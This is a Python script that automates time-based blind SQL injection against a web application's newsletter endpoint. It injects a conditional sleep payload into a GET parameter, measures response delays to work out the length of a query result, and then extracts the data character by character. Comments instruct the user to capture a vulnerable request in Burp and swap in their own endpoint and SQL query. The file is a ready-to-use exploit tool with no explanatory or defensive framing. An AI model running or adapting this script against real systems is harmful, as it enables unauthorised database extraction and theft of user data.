import requests
import sys
import time


# ---------------------------------------------------------------
#   How to use:
#   Capture a vulnerable GET request in Burp or look in the URL bar
#   Change the endpoint and the GET parameters to the vulnerable endpoint and its parameters ie. /newsletter.php?name=test&email=test
#   Change the SQL Query in brute_db function
# ---------------------------


# Send the payload to the vulnerable parameter on the target host
# If it takes 5 seconds or longer to get a reply, return True
def send_payload(ip, payload):
    start = time.time()
    r = requests.get("http://" + ip + "/newsletter.php?name=test&email=test' OR IF (%s, sleep(5), 'NO') AND '1'='1'" % payload)   # ----- CHANGE THE ENDPOINT and PARAMETERS
    end = time.time()
    if end - start >= 5:
        return True
    else:
        return False


# Brute-force the length of the data
# Iterate to all possible letters and brute-force the data
def brute_db(ip):
    length = 0
    for i in range(0, 100):
        if send_payload(ip, "LENGTH((select users from table))='%d'" % i):   # --- CHANGE SQL QUERY
            length = i
            break
    print("Length: %d" % length)
    sys.stdout.write("Dumping: ")
    sys.stdout.flush()
    db_name = ""
    for i in range(1, length + 1):
        for j in range(96, 123):
            if send_payload(ip, "SUBSTRING((select users from table),%d, 1) = '%s'" % (i, chr(j))):   # --- CHANGE SQL QUERY
                db_name += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.flush()
    return db_name


def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <ip>" % (sys.argv[0]))
        sys.exit(1)
    ip = sys.argv[1]
    test = brute_db(ip)
    print("Data: %s" % test)


if __name__ == "__main__":
    main()
